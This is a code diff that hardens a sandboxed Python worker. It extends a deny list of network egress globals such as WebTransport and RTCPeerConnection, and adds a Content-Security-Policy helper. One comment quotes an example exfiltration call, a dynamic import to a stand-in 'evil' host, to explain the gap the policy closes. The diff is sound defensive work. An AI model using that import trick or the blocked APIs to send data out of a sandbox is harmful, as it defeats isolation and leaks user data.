@@ -43,8 +43,36 @@ export const REMOVED_NETWORK_GLOBALS = [
 	"Worker",
 	"SharedWorker",
 	"ServiceWorkerContainer",
+	// Egress APIs `connect-src` either does not cover (WebRTC) or that a module
+	// worker has no business using; removed as defence in depth next to the
+	// response CSP the worker script is served with (see `executionWorkerCsp`).
+	"WebTransport",
+	"WebSocketStream",
+	"RTCPeerConnection",
+	"webkitRTCPeerConnection",
+	"RTCDataChannel",
+	"RTCSessionDescription",
+	"importScripts",
 	"navigator" /* only sendBeacon/sendBeacon-like members below */,
 ] as const;
+
+/**
+ * The Content-Security-Policy the worker script is served with (`server.js`
+ * sets it on `/_app/immutable/workers/*`). The wrapped `fetch` and the deleted
+ * globals cannot stop dynamic `import("https://evil/?d=…")`, which is syntax
+ * and reachable from Python through `js.eval`, nor anything else a deleted
+ * name misses. A worker's own policy comes from its script's response, so this
+ * is the one place those are closed: scripts only from this origin, connections
+ * only to this origin (plus the PyPI hosts, which the gate still opens only on
+ * opt-in). `unsafe-eval` stays because Pyodide's `js` bridge needs it; the
+ * `script-src` allowlist is what keeps eval'd `import()` at home. Audit M5.
+ */
+export function executionWorkerCsp(): string {
+	return [
+		"script-src 'self' 'unsafe-eval' 'wasm-unsafe-eval'",
+		`connect-src 'self' ${PYPI_ALLOWED_ORIGINS.join(" ")}`,
+	].join("; ");
+}
 
 /** Controller handed back by {@link installNetworkGate} to flip the PyPI escape hatch live. */
 export interface NetworkGateController {
